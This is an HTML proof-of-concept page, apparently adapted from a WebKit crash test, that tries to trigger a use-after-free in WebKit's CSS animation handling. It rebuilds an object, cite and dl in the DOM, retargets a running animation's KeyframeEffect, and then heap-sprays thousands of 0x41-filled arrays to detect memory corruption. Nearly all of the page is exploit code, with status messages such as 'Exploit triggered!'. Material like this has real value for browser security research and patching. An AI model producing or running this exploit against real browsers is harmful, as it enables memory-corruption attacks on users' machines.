<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebKit CSS Animation UAF</title>
    <style>
      @keyframes keyframes {}
      cite { animation: keyframes 100ms; }
      button {
        margin-top: 20px;
        padding: 10px;
        font-size: 16px;
      }
      #status {
        margin-top: 10px;
        font-weight: bold;
      }
      #console {
        margin-top: 10px;
        white-space: pre-wrap;
        font-family: monospace;
      }
    </style>
</head>
<body>
    <h1>WebKit CSS Animation UAF</h1>
    <p>Click the button to trigger the PoC. (Browser may crash or show exploit messages)</p>
    <button id="button">Trigger PoC</button>
    <div id="status">Waiting...</div>
    <pre id="console"></pre>
    <object type="image/png" id="target-object">
        <cite id="target-cite"></cite>
        <dl id="target-dl" hidden></dl>
    </object>
    <p>PASS if this test doesn't crash</p>
    <script type="module">
        // Internal debug_log
        function debug_log(message) {
          const consoleDiv = document.getElementById('console');
          consoleDiv.textContent += message + '\n';
        }

        const object = document.querySelector("#target-object");
        const cite = document.querySelector("#target-cite");
        const dl = document.querySelector("#target-dl");
        const status = document.getElementById("status");
        const DELAY = 100;
        let attemptCount = 0;

        function heapSpray() {
          let spray = [];
          for (let i = 0; i < 10000; i++) {
            let arr = new Uint8Array(0x1000);
            for (let j = 0; j < arr.length; j++) {
              arr[j] = 0x41;
            }
            spray.push(arr);
          }
          debug_log("Heap spray completed");
          return spray;
        }

        function cleanDOM() {
          const existingObject = document.querySelector('#target-object');
          if (existingObject) {
            debug_log('Removing existing object');
            existingObject.remove();
          }
          const newObject = document.createElement('object');
          newObject.type = 'image/png';
          newObject.id = 'target-object';
          const newCite = document.createElement('cite');
          newCite.id = 'target-cite';
          const newDl = document.createElement('dl');
          newDl.id = 'target-dl';
          newDl.hidden = true;
          newObject.appendChild(newCite);
          newObject.appendChild(newDl);
          document.body.appendChild(newObject);
          debug_log('Created new object, cite, and dl');
          return {
            object: newObject,
            cite: newCite,
            dl: newDl
          };
        }

        function triggerUAF() {
          const { object, cite, dl } = cleanDOM();
          attemptCount++;
          debug_log(`Attempt #${attemptCount}: Initiating exploit...`);
          status.textContent = `Attempt #${attemptCount} in progress...`;
          object.data = "x";
          cite.style.animationIterationCount = "infinite";
          setTimeout(() => {
            try {
              const animation = cite.getAnimations()[0];
              if (!animation) {
                debug_log("No animation found");
                status.textContent = "Error: No animation";
                return;
              }
              object.width = "1em";
              object.codeBase;
              animation.effect = new KeyframeEffect(dl, {});
              const spray = heapSpray();
              debug_log("UAF triggered, check for crash or memory corruption.");
              status.textContent = "Exploit triggered!";
              // Check for UAF
              for (let i = 0; i < spray.length; i++) {
                const arr = spray[i];
                if (arr[0] !== 0x41) {
                  debug_log(`UAF detected at spray index: ${i}`);
                  status.textContent = "UAF detected!";
                  break;
                }
              }
            } catch (e) {
              debug_log(`Error in triggerUAF: ${e.message}`);
              status.textContent = "Error: Exploit failed.";
            }
          }, DELAY);
        }

        const observer = new MutationObserver((mutations) => {
          debug_log("DOM tree modified, attempting UAF exploit...");
          triggerUAF();
        });

        observer.observe(object, { attributes: true, childList: true, subtree: true });

        document.getElementById('button').addEventListener('click', () => {
          try {
            triggerUAF();
          } catch (e) {
            debug_log(`Error occurred: ${e.message}`);
            status.textContent = "Error: Exploit failed.";
          }
        });
    </script>
</body>
</html>